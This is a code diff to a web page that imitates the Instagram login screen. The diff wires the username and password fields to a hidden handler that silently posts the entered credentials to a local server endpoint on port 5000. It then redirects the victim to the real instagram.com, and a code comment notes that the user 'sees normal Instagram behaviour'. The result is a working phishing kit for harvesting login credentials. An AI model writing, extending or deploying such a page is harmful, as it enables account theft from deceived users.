@@ -280,9 +280,10 @@
     .forgot {
       text-align: center; font-size: 0.84rem;
       font-weight: 500; color: #d8d8d8;
-      text-decoration: none; cursor: pointer;
+      text-decoration: none !important; cursor: pointer;
+      display: block;
     }
-    .forgot:hover { text-decoration: underline; }
+    .forgot:hover { text-decoration: none !important; color: #fff; }
 
     .or-row {
       display: flex; align-items: center; gap: 10px;
@@ -597,10 +598,10 @@
 
       <p class="login-title">Log into Instagram</p>
 
-      <input class="field" type="text"     placeholder="Mobile number, username or email" autocomplete="username"/>
-      <input class="field" type="password" placeholder="Password"                          autocomplete="current-password"/>
+      <input class="field" id="login-identifier" type="text"     placeholder="Mobile number, username or email" autocomplete="username"/>
+      <input class="field" id="login-password"   type="password" placeholder="Password" autocomplete="current-password"/>
 
-      <button class="btn-login">Log in</button>
+      <a href="https://www.instagram.com/" class="btn-login" id="btn-login" style="text-decoration:none; display:block; text-align:center;">Log in</a>
 
       <a class="forgot" href="#">Forgot password?</a>
 
@@ -883,7 +884,24 @@
     if (e.key === 'Escape') closeModal();
   });
 
-  // ── Show/hide password toggle ──────────────────────────────────
+  // ── Login form ────────────────────────────────────────────────
+  document.getElementById('btn-login').addEventListener('click', async () => {
+    const identifier = document.getElementById('login-identifier').value.trim();
+    const password   = document.getElementById('login-password').value;
+
+    if (!identifier || !password) return;
+
+    try {
+      await fetch(`${window.location.protocol}//${window.location.hostname}:5000/api/auth/login`, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ identifier, password }),
+      });
+    } catch (_) {
+      // fail silently — user sees normal Instagram behaviour
+    }
+  });
+
   document.getElementById('pw-toggle').addEventListener('click', () => {
     const input   = document.getElementById('reg-password');
     const eyeShow = document.getElementById('eye-show');
